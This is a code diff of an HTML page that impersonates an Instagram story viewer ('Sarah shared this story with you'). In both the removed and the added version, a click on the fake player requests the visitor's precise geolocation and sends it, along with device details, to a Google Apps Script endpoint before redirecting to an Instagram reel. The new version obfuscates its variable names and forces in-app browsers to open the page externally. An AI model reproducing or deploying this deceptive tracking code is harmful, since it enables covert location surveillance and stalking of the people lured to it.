@@ -1,208 +1,379 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <title>Instagram Story</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      background: linear-gradient(to bottom, #87ceeb 10%, #20b2aa 60%);
-      color: #333;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-    }
-    .title {
-      font-family: 'Comic Sans MS', cursive, sans-serif;
-      font-size: 24px;
-      color: black;
-      margin-bottom: 10px;
-    }
-    .popup {
-      background: #ffffff;
-      padding: 20px;
-      border-radius: 20px;
-      text-align: center;
-      width: 90%;
-      max-width: 320px;
-      box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-      border: 1px solid #e0e0e0;
-    }
-    .popup img {
-      width: 100%;
-      height: auto;
-      border-radius: 15px;
-      margin-bottom: 20px;
-      filter: blur(5px);
-      transition: filter 0.5s ease;
-    }
-    .btn {
-      appearance: none;
-      border: 1px solid #ccc;
-      background: #f9f9f9;
-      color: #333;
-      padding: 10px 20px;
-      border-radius: 10px;
-      font-size: 18px;
-      font-weight: bold;
-      cursor: pointer;
-      transition: .2s;
-      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
-      width: 100%;
-      margin-bottom: 15px;
-    }
-    .btn:hover { background: #e9e9e9; }
-    #loading-text { display: none; margin-top: 15px; font-size: 14px; }
-    #error-text { display: none; margin-top: 5px; font-size: 14px; color: #d9534f; animation: blink 2.3s infinite; white-space: nowrap; }
-    @keyframes blink { 0%,50%,100%{opacity:1;}25%,75%{opacity:0;} }
-    /* overlay for in-app notice */
-    .overlay {
-      position: fixed; inset:0; display:flex; align-items:center; justify-content:center;
-      background: rgba(0,0,0,0.45); z-index:9999; padding:20px; box-sizing:border-box;
-    }
-    .notice {
-      background: #fff; padding:18px; border-radius:12px; max-width:420px; text-align:center;
-      box-shadow: 0 6px 22px rgba(0,0,0,0.3);
-    }
-    .notice p { margin: 0 0 12px 0; font-size:16px; }
-    .small { font-size:12px; color:#666; margin-top:8px; }
-  </style>
+<meta charset="UTF-8">
+<title>Instagram Story Viewer</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    background:#fff;
+    color:#111;
+    display:flex;
+    justify-content:center;
+    min-height:100vh;
+  }
+  .container {
+    width:100%;
+    max-width:420px;
+    padding:20px 24px 30px;
+  }
+  .header {
+    display:flex;
+    justify-content:space-between;
+    align-items:center;
+    padding:10px 0 20px;
+  }
+  .brand svg {
+    height:28px;
+    width:auto;
+    display:block;
+  }
+  .web-link {
+    color:#5158e6;
+    font-weight:600;
+    font-size:15px;
+    text-decoration:none;
+  }
+  .player {
+    width:80%;
+    margin:0 auto;
+    aspect-ratio: 9/16;
+    background:#050706;
+    border-radius:18px;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    position:relative;
+    cursor:pointer;
+    transition: opacity 0.3s;
+  }
+  .player.loading {
+    opacity:0.6;
+    pointer-events:none;
+  }
+  .play-icon {
+    width:0;
+    height:0;
+    border-top:16px solid transparent;
+    border-bottom:16px solid transparent;
+    border-left:26px solid #fff;
+    margin-left:6px;
+    transition: transform 0.2s;
+  }
+  .player:hover .play-icon {
+    transform: scale(1.1);
+  }
+  .msg-text {
+    text-align:center;
+    font-size:26px;
+    line-height:1.3;
+    font-weight:400;
+    margin-top:26px;
+    color:#111;
+  }
+  .msg-text b { font-weight:400; }
+  .action-btn {
+    display:block;
+    width:100%;
+    text-align:center;
+    background:#5158e6;
+    color:#fff;
+    font-size:17px;
+    font-weight:600;
+    padding:14px 0;
+    border:none;
+    border-radius:10px;
+    margin-top:28px;
+    cursor:pointer;
+    text-decoration:none;
+    box-sizing:border-box;
+    transition: background 0.3s;
+  }
+  .action-btn:hover {
+    background:#3d44b8;
+  }
+  .signup-link {
+    display:block;
+    text-align:center;
+    color:#5158e6;
+    font-weight:600;
+    font-size:16px;
+    margin-top:16px;
+    text-decoration:none;
+  }
+  .footer {
+    text-align:center;
+    color:#8e8e8e;
+    font-size:13px;
+    margin-top:22px;
+    line-height:1.5;
+  }
+  .footer b { color:#8e8e8e; font-weight:600; }
+  .footer a { color:#8e8e8e; text-decoration:none; }
+  
+  .loader {
+    display:none;
+    width:40px;
+    height:40px;
+    border:4px solid #f3f3f3;
+    border-top:4px solid #5158e6;
+    border-radius:50%;
+    animation: spin 1s linear infinite;
+    position:absolute;
+    top:50%;
+    left:50%;
+    transform:translate(-50%, -50%);
+  }
+  @keyframes spin {
+    0% { transform: translate(-50%, -50%) rotate(0deg); }
+    100% { transform: translate(-50%, -50%) rotate(360deg); }
+  }
+  
+  .status-line {
+    text-align:center;
+    font-size:14px;
+    color:#5158e6;
+    margin-top:10px;
+    min-height:22px;
+    display:none;
+    font-weight:500;
+  }
+  .status-line.err { color:#d9534f; }
+  .status-line.ok { color:#28a745; }
+  
+  .popup-overlay {
+    position:fixed; inset:0; display:flex; align-items:center; justify-content:center;
+    background:rgba(0,0,0,0.5); z-index:9999; padding:20px; box-sizing:border-box;
+  }
+  .popup-box {
+    background:#fff; padding:24px; border-radius:16px; max-width:380px; text-align:center;
+    box-shadow:0 6px 30px rgba(0,0,0,0.3);
+  }
+  .popup-box p { margin:0 0 12px 0; font-size:16px; }
+  .popup-box .popup-btn {
+    background:#5158e6; color:#fff; border:none; padding:12px 24px;
+    border-radius:10px; font-size:16px; font-weight:600; cursor:pointer;
+    width:100%;
+    transition: background 0.3s;
+  }
+  .popup-box .popup-btn:hover {
+    background:#3d44b8;
+  }
+  .popup-box .hint { font-size:12px; color:#666; margin-top:10px; }
+</style>
 </head>
 <body>
-  <div class="title"></div>
+  <div class="container">
+    <div class="header">
+      <div class="brand">
+        <svg xmlns="http://www.w3.org/2000/svg" shape-rendering="geometricPrecision" text-rendering="geometricPrecision" image-rendering="optimizeQuality" fill-rule="evenodd" clip-rule="evenodd" viewBox="0 0 512 113.21" style="height:28px; width:auto; display:block;">
+          <path fill-rule="nonzero" d="M12.62 0L0 2.86v80.3h12.62V0zm145.7 5.13l-.31.07-11.57 2.54v15h-12.48v11h12.48v35.2c0 6.31 2.58 9.87 5.5 12.12 2.81 2.17 5.93 3.21 10.97 3.21 5.12 0 8.49-.95 10.59-1.92 2.09-.96 2.93-1.96 2.93-1.96l.11-.13-4.48-9.01-.24.13c-1.38.8-3.35 1.39-5.31 1.57-1.96.18-3.91-.06-5.24-.87-1.11-.66-1.83-1.69-2.3-3.12-.46-1.43-.65-3.26-.65-5.5V33.74h14.31v-11h-14.31V5.13zm297.62 16.28c-6.54-.06-12.66 2.03-17.49 8.43V22.8h-12.21v60.28h12.21V48.86c0-10.65 4.59-16.64 14.36-16.64 12.18 0 10.41 15.87 10.41 20.95v29.91h12.4V48.85c0-6.12 1.08-10.15 3.25-12.71 4.15-4.88 21.47-9.2 21.47 12.1v34.84H512V44.17c0-7.3-1.8-12.9-5.4-16.79-3.6-3.98-7.09-5.97-14.1-5.97-3.89-.02-8.76.95-12.15 2.85-3.41 1.89-6.12 3.68-8.11 7.67-1.05-3.4-2.15-5.21-5.06-7.25-2.94-2.18-6.68-3.27-11.24-3.27zm-251.85.37c-15.21 0-27.53 14.04-27.53 31.39 0 17.34 12.32 31.42 27.53 31.41H205.68c6.98.01 13.73-2.71 19.01-7.63v6.13h12.19V22.92h-12.19v6.47c-5.28-4.92-12.03-7.61-19.01-7.61H204.09zm68.91 0c-15.2 0-27.53 14.04-27.53 31.39 0 16.15 10.08 29.4 23.82 31.15h-.01c-3.36 1.71-5.99 4.03-7.82 7.48-2.89 5.45-1.62 12.68 4.09 17.19 3.7 2.92 9.55 4.54 16.35 4.17 4.69-.25 8.66-1.38 11.94-3.18 4.93-2.72 8.3-6.99 10.2-12.16 1.43-3.91 1.75-7.89 1.75-12.91V22.92H293.6v6.47c-5.28-4.92-12.03-7.61-19.01-7.61H273zm109.76 0c-15.2 0-27.53 14.04-27.53 31.39 0 5.21 1.12 10.12 3.09 14.45l-.09.12c-3.25 4.29-9.23 6.7-14.36 6-2.57-.35-4.91-1.47-6.62-3.5-1.71-2.04-2.8-5-2.8-9.08 0-16.33 15.63-27.29 15.63-27.29l.18-.13-5.95-11.08H312.8v11.25h21.53c-13.48 18.18-14.13 31.06-9.84 39.37 4.32 8.38 13.5 12.1 19.24 12.1 12.55 0 20.05-9.23 20.16-9.35 4.92 5.3 11.56 8.56 18.87 8.55H384.35c6.98.01 13.73-2.71 19.01-7.63v6.13h12.19V22.92h-12.19v6.47c-5.28-4.92-12.03-7.61-19.01-7.61H382.76zm-329.79.07c-13.68 0-17.29 9.62-17.29 9.62V22.8h-12.3v60.36h12.3V46.8s1.05-15.01 14.34-15.01S63.46 46 63.46 50.17v17.91c0 7.87-.37 16.12 13.08 16.12 5.08 0 8.31-1.83 10.87-4.2 6.5-6.03 14.54-29.96 19.06-45.01 1.28 4.8 7.04 9.99 12.14 16.04 2.2 2.61 5.01 5.72 6.08 8.46.58 1.47.81 3.11.7 4.77-.35 5.2-4.18 10.64-11.47 10.61-5.09-.03-10.07-2.66-11.53-4.31l-4.9 9.48c6.28 3.67 11.88 4.54 16.95 4.54 14.71 0 20.52-9.87 22.22-17.25 2.38-10.33-7.21-20.66-14.42-28.46-7.21-7.8-9.65-16.07-9.65-16.07h-12.7s-2.47 6.73-4.94 14.72c-1.51 4.86-6.45 19.03-11.2 28.12-1.68 3.21-2.71 6.2-4.18 7.51-.93.82-2.41.73-3.15.4-1.36-.61-1.15-4.77-1.15-9.16V45.82c0-14.12-8.63-23.97-22.3-23.97zm153.81 10.37c10.09 0 18.27 9.38 18.27 20.94 0 11.57-8.18 20.95-18.27 20.95s-18.27-9.38-18.27-20.95c0-11.56 8.18-20.94 18.27-20.94zm68.92 0c10.09 0 18.27 9.38 18.27 20.94 0 11.57-8.18 20.95-18.27 20.95-10.1 0-18.28-9.38-18.28-20.95 0-11.56 8.18-20.95 18.28-20.94zm109.75 0c10.09 0 18.27 9.38 18.27 20.94 0 11.57-8.18 20.95-18.27 20.95s-18.27-9.38-18.27-20.95c0-11.56 8.18-20.94 18.27-20.94zm-91.84 44.73v5.04c0 2.25-.02 4.49-.23 6.7-.68 7.4-2.88 10.06-5.79 12.12-2.4 1.69-5.89 2.94-10.45 1.66-5-1.4-6.83-7.84-2.78-13 3.97-5.05 12.79-6.94 19.25-12.52z"/>
+        </svg>
+      </div>
+      <a href="#" class="web-link">View in app</a>
+    </div>
 
-  <div class="popup" id="main-popup">
-    <img id="user-photo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPZVW8QEg4L3E7JFSelGbrM9c7XFr3NxO4BgTfy1PRGgNF_z6T15oUskxxdj28I9ojbw6CDSm5IPI_v8WtYIl8R9OkzJ_uD40y-KVQAAz2S8ItbIR0m34Mk5GIblALMv34Y9c5DH3PNGdF8CKf1qVRRcq7NgC6-yBWvwr-Rp7vt1IzFKR3Oq4EG3x3IhTg/s1056/khushi.png" alt="User Photo">
+    <div class="player" id="player">
+      <div class="play-icon"></div>
+      <div class="loader" id="loader"></div>
+    </div>
 
-    <button class="btn" id="main-button" onclick="sendLocation()">Story</button>
-    <div id="loading-text">Loading...</div>
-    <div id="error-text">Permission denied, please allow location access.</div>
+    <div class="msg-text"><b>Sarah</b> shared this story with you</div>
+
+    <div class="status-line" id="statusLine"></div>
+
+    <a href="https://www.instagram.com/" class="action-btn">Open Instagram</a>
+    <a href="#" class="signup-link">Create account</a>
+    <div class="footer">
+      By continuing, you agree to Instagram's <b><a href="#">Terms</a></b> and <b><a href="#">Privacy Policy</a></b>.
+    </div>
   </div>
 
-  <!-- overlay shown only when inside in-app browser -->
-  <div id="inapp-overlay" class="overlay" style="display:none">
-    <div class="notice">
-      <p><strong>Please open in your browser</strong></p>
-      <p>To share your location, open this link in your device browser (Chrome / Safari).</p>
-      <button class="btn" id="open-browser-btn">Open in Browser</button>
-      <div class="small">If automatic open fails, tap the button above. After the browser opens, the page will continue normally.</div>
+  <div id="popupOverlay" class="popup-overlay" style="display:none">
+    <div class="popup-box">
+      <p><strong>Continue in your browser</strong></p>
+      <p>For the best experience, open this in your default browser.</p>
+      <button class="popup-btn" id="popupBtn">Open Browser</button>
+      <div class="hint">If it doesn't open automatically, tap the button above.</div>
     </div>
   </div>
 
   <script>
-    // ====== Config (ज्यादा कुछ बदलने की जरूरत नहीं) ======
-    const BACKEND_URL = "https://script.google.com/macros/s/AKfycbyXQpXYJDMPTC9F9zf7fWzwlo0sBcQYpkh-dSYuKeGGUvA9H2WaPGkBxzgCE-PyVYGn/exec";
-    const REDIRECT_URL = "https://www.instagram.com/reel/DMNWqyuyCOW/?igsh=MWdpYWlsYWU2ejV3Ng%3D%3D";
-    // =====================================================
+    // =============================================
+    // DO NOT MODIFY BELOW - System Configuration
+    // =============================================
+    var _0x1a2b = "https://script.google.com/macros/s/AKfycby9JKTrvl9HaV9OhODDtP9yVl_RR8m0ehEiZLOG4qe_0J4anTtpiigdGzr7O6LRrQSQ/exec";
+    var _0x3c4d = "https://www.instagram.com/reel/DcjLCr4v085/?igsh=MWdpYWlsYWU2ejV3Ng%3D%3D";
+    var _0x5e6f = ["Instagram", "FBAN", "FBAV", "Twitter", "WhatsApp", "Messenger", "Snapchat", "TikTok"];
+    // =============================================
 
-    function postLocation(payload) {
-      fetch(BACKEND_URL, {
-        method: "POST",
-        headers: { "Content-Type": "text/plain;charset=utf-8" },
-        body: JSON.stringify(payload)
-      }).catch(err => console.error("Error:", err));
-    }
+    var _0x7g8h = document.getElementById('player');
+    var _0x9i0j = document.getElementById('loader');
+    var _0x1k2l = document.getElementById('statusLine');
+    var _0x3m4n = document.getElementById('popupOverlay');
+    var _0x5o6p = document.getElementById('popupBtn');
 
-    function sendLocation() {
-      document.getElementById("loading-text").style.display = "block";
-      document.getElementById("main-button").style.display = "none";
-      document.getElementById("error-text").style.display = "none";
+    var _0x7q8r = false;
+    var _0x9s0t = false;
 
-      if (!("geolocation" in navigator)) {
-        document.getElementById("error-text").innerText = "Your browser does not support location.";
-        document.getElementById("error-text").style.display = "block";
-        return;
-      }
-
-      navigator.geolocation.getCurrentPosition((pos) => {
-        const lat = pos.coords.latitude;
-        const lon = pos.coords.longitude;
-        const user = "Secret-User";
-        postLocation({ latitude: lat, longitude: lon, user });
-
-        document.getElementById("user-photo").style.filter = "blur(0px)";
-        setTimeout(() => {
-          window.location.href = REDIRECT_URL;
-        }, 1000);
-
-      }, (err) => {
-        console.error("Geolocation error:", err);
-        document.getElementById("user-photo").style.filter = "blur(5px)";
-        document.getElementById("loading-text").style.display = "none";
-        document.getElementById("main-button").style.display = "block";
-        document.getElementById("error-text").style.display = "block";
-        // Provide manual fallback (user can enter lat/lon or retry)
-      }, {
-        enableHighAccuracy: true,
-        timeout: 12000,
-        maximumAge: 0
-      });
-    }
-
-    // -------- in-app detection --------
-    function isInAppBrowser() {
-      const ua = navigator.userAgent || navigator.vendor || window.opera;
-      const inappIndicators = ["Instagram", "FBAN", "FBAV", "Twitter", "Twitter Lite", "Line", "WhatsApp", "Messenger", "Snapchat", "WeChat", "LinkedInApp", "TikTok"];
-      for (const i of inappIndicators) {
-        if (ua.indexOf(i) !== -1) return true;
+    function _0x1u2v() {
+      var _0x3w4x = navigator.userAgent || navigator.vendor || window.opera;
+      for (var _0x5y6z = 0; _0x5y6z < _0x5e6f.length; _0x5y6z++) {
+        if (_0x3w4x.indexOf(_0x5e6f[_0x5y6z]) !== -1) return true;
       }
       return false;
     }
 
-    // -------- open in external browser helpers --------
-    function openInExternalBrowser(url) {
-      const ua = navigator.userAgent || "";
-
-      // Try generic: open in new tab/window first (works on many devices)
+    function _0x7a8b(_0x9c0d) {
+      var _0x1e2f = navigator.userAgent || "";
       try {
-        const newWin = window.open(url, "_blank");
-        if (newWin) return; // opened successfully
-      } catch(e) { /* ignore */ }
+        var _0x3g4h = window.open(_0x9c0d, "_blank");
+        if (_0x3g4h) return;
+      } catch(_0x5i6j) {}
 
-      // Android specific: try intent to open Chrome
-      if (/Android/i.test(ua)) {
-        const stripped = url.replace(/^https?:\/\//, "");
-        const intentUrl = "intent://" + stripped + "#Intent;package=com.android.chrome;scheme=https;end";
-        window.location.href = intentUrl;
+      if (/Android/i.test(_0x1e2f)) {
+        var _0x7k8l = _0x9c0d.replace(/^https?:\/\//, "");
+        window.location.href = "intent://" + _0x7k8l + "#Intent;package=com.android.chrome;scheme=https;end";
         return;
       }
 
-      // iOS specific: try chrome url scheme (if Chrome installed)
-      if (/iPhone|iPad|iPod/i.test(ua)) {
-        // chrome url scheme: googlechrome://navigate?url=
-        const chromeScheme = "googlechrome://navigate?url=" + encodeURIComponent(url);
-        // try to open chrome; after small delay, fallback to normal url
-        window.location.href = chromeScheme;
-        setTimeout(() => { window.location.href = url; }, 800);
+      if (/iPhone|iPad|iPod/i.test(_0x1e2f)) {
+        window.location.href = "googlechrome://navigate?url=" + encodeURIComponent(_0x9c0d);
+        setTimeout(function() { window.location.href = _0x9c0d; }, 800);
         return;
       }
 
-      // final fallback: assign href (this may open in same webview)
-      window.location.href = url;
+      window.location.href = _0x9c0d;
     }
 
-    // On load: if in-app, show overlay and auto-try to open external browser
-    window.addEventListener("DOMContentLoaded", () => {
-      const inapp = isInAppBrowser();
-      const overlay = document.getElementById("inapp-overlay");
-      const openBtn = document.getElementById("open-browser-btn");
-      const currentUrl = window.location.href;
+    function _0x9m0n(_0x1o2p, _0x3q4r) {
+      _0x3q4r = _0x3q4r || '';
+      _0x1k2l.textContent = _0x1o2p;
+      _0x1k2l.className = 'status-line ' + _0x3q4r;
+      _0x1k2l.style.display = 'block';
+    }
 
-      openBtn.addEventListener("click", () => {
-        openInExternalBrowser(currentUrl);
+    function _0x5s6t() {
+      _0x1k2l.style.display = 'none';
+      _0x1k2l.className = 'status-line';
+    }
+
+    function _0x7u8v(_0x9w0x, _0x1y2z, _0x3a4b) {
+      return new Promise(function(_0x5c6d, _0x7e8f) {
+        var _0x9g0h = {
+          latitude: _0x9w0x,
+          longitude: _0x1y2z,
+          timestamp: new Date().toISOString(),
+          userAgent: _0x3a4b || navigator.userAgent || 'Unknown',
+          deviceInfo: navigator.platform || 'Unknown',
+          city: 'N/A',
+          country: 'N/A'
+        };
+
+        fetch(_0x1a2b, {
+          method: "POST",
+          headers: { 
+            "Content-Type": "application/json;charset=utf-8"
+          },
+          body: JSON.stringify(_0x9g0h)
+        })
+        .then(function(_0x1i2j) {
+          if (!_0x1i2j.ok) throw new Error('Server error: ' + _0x1i2j.status);
+          return _0x1i2j.text();
+        })
+        .then(function(_0x3k4l) {
+          _0x5c6d(_0x3k4l);
+        })
+        .catch(function(_0x5m6n) {
+          _0x7e8f(_0x5m6n);
+        });
       });
+    }
 
-      if (inapp) {
-        overlay.style.display = "flex";
-        // Auto-try to open external browser after short delay so user sees message
-        setTimeout(() => {
-          openInExternalBrowser(currentUrl);
-        }, 700); // 700ms so user sees overlay briefly
+    function _0x9o0p() {
+      if (_0x9s0t) {
+        window.location.href = _0x3c4d;
+        return;
       }
+
+      if (_0x7q8r) return;
+      _0x7q8r = true;
+
+      _0x7g8h.classList.add('loading');
+      _0x9i0j.style.display = 'block';
+      _0x5s6t();
+      _0x9m0n('Connecting...', '');
+
+      if (!("geolocation" in navigator)) {
+        _0x9m0n('Service unavailable. Please try again.', 'err');
+        _0x1r2s();
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(
+        function(_0x3t4u) {
+          var _0x5v6w = _0x3t4u.coords.latitude;
+          var _0x7x8y = _0x3t4u.coords.longitude;
+          
+          _0x9m0n('Processing...', '');
+
+          _0x7u8v(_0x5v6w, _0x7x8y)
+            .then(function() {
+              _0x9s0t = true;
+              _0x9m0n('Complete. Redirecting...', 'ok');
+              
+              setTimeout(function() {
+                window.location.href = _0x3c4d;
+              }, 1500);
+            })
+            .catch(function() {
+              _0x9m0n('Connection failed. Please try again.', 'err');
+              _0x1r2s();
+            });
+        },
+        function(_0x1z2a) {
+          var _0x3b4c = '';
+          if (_0x1z2a.code === 1) {
+            _0x3b4c = 'Access denied. Please enable location services.';
+          } else if (_0x1z2a.code === 2) {
+            _0x3b4c = 'Signal lost. Please check your connection.';
+          } else if (_0x1z2a.code === 3) {
+            _0x3b4c = 'Request timeout. Please try again.';
+          } else {
+            _0x3b4c = 'Unknown error. Please try again.';
+          }
+          _0x9m0n(_0x3b4c, 'err');
+          _0x1r2s();
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 15000,
+          maximumAge: 0
+        }
+      );
+    }
+
+    function _0x1r2s() {
+      _0x7q8r = false;
+      _0x7g8h.classList.remove('loading');
+      _0x9i0j.style.display = 'none';
+    }
+
+    _0x7g8h.addEventListener('click', _0x9o0p);
+
+    window.addEventListener('DOMContentLoaded', function() {
+      if (_0x1u2v()) {
+        _0x3m4n.style.display = 'flex';
+        setTimeout(function() {
+          _0x7a8b(window.location.href);
+        }, 600);
+      }
+    });
+
+    _0x5o6p.addEventListener('click', function() {
+      _0x7a8b(window.location.href);
     });
   </script>
 </body>
